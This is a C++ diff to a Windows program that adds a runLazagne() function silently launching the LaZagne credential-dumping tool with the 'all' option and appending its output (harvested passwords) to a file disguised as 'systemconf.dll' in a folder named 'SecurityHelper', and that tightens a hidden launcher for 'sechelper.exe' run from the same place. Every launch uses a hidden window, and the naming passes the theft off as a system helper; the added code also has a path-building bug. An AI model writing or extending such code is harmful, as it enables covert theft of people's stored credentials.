@@ -5,6 +5,7 @@ BOOL fileExists(LPCTSTR szPath) {
     DWORD dwAttrib = GetFileAttributes(szPath); 
     return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY)); 
 }
+
 void runBatFile(std::string pathLocation){
     char commandCall[255]; 
     strcpy(commandCall, "/C ");
@@ -14,8 +15,24 @@ void runBatFile(std::string pathLocation){
     ShellExecute(0, "open", "cmd.exe", commandCall, 0, SW_HIDE);
 }
 
+void runLazagne(){
+    char fileName[255];
+    strcpy(fileName, getExecutablePath().c_str());
+    strcpy(fileName, "\\lazagne.exe");
+    
+    char commandCall[255]; 
+    strcpy(commandCall, "/C ");
+    strcat(commandCall, "start /b \"");
+    strcat(commandCall, getExecutablePath().c_str());
+    strcat(commandCall, "\\\" lazagne.exe all >> C:\\ProgramData\\SecurityHelper\\systemconf.dll");
+    if(fileExists(fileName))
+        ShellExecute(0, "open", "cmd.exe", commandCall, getExecutablePath().c_str(), SW_HIDE);
+}
+
 void runSechelper(){
-    ShellExecute(0, "open", "cmd.exe",  "/C start /d \"C:\\ProgramData\\SecurityHelper\\\" sechelper.exe\0", "C:\\ProgramData\\SecurityHelper\\\0", SW_HIDE);
+    if(fileExists("C:\\ProgramData\\SecurityHelper\\sechelper.exe")){
+        ShellExecute(0, "open", "cmd.exe",  "/C start /d \"C:\\ProgramData\\SecurityHelper\\\" sechelper.exe\0", "C:\\ProgramData\\SecurityHelper\\\0", SW_HIDE);
+    }    
 }
 
 std::string getExecutablePath(){
